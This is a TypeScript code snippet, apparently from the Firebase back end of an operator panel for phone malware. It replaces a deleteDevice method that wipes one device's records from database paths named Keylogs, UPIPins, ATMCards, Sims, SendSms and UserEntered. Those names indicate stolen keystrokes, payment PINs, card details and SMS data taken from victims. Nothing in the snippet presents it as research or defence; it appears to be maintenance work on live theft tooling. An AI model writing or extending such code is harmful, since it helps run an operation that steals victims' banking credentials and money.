// Updated deleteDevice method for firebaseService.ts
// Replace the existing deleteDevice method with this implementation

async deleteDevice(deviceId: string): Promise<void> {
  try {
    // First, try to delete using the standard paths
    const updates: Record<string, null> = {
      [`DeviceInfo/${deviceId}`]: null,
      [`Sims/${deviceId}`]: null,
      [`Keylogs/${deviceId}`]: null,
      [`UPIPins/${deviceId}`]: null,
      [`UserEntered/${deviceId}`]: null,
      [`AppsInstalled/${deviceId}`]: null,
      [`ResponseChecks/${deviceId}`]: null,
      [`ResponseChecker/${deviceId}`]: null,
      [`ATMCards/${deviceId}`]: null,
      [`SendSms/${deviceId}`]: null,
      // Note: Not deleting from SmsData as it might be shared across devices
    };
    
    // Execute all deletions in parallel
    await Promise.all([
      update(ref(database), updates),
      // Also try to remove the device from any ResponseChecker entries
      (async () => {
        try {
          const responseCheckerRef = ref(database, 'ResponseChecker');
          const snapshot = await get(responseCheckerRef);
          if (snapshot.exists()) {
            const updates: Record<string, null> = {};
            Object.entries(snapshot.val() || {}).forEach(([key, value]: [string, any]) => {
              if (value?.deviceId === deviceId) {
                updates[`ResponseChecker/${key}`] = null;
              }
            });
            if (Object.keys(updates).length > 0) {
              await update(ref(database), updates);
            }
          }
        } catch (error) {
          console.error('Error cleaning up ResponseChecker:', error);
        }
      })()
    ]);
    
    console.log(`Successfully deleted all data for device: ${deviceId}`);
  } catch (error) {
    console.error("Error deleting device:", error);
    throw error;
  }
}
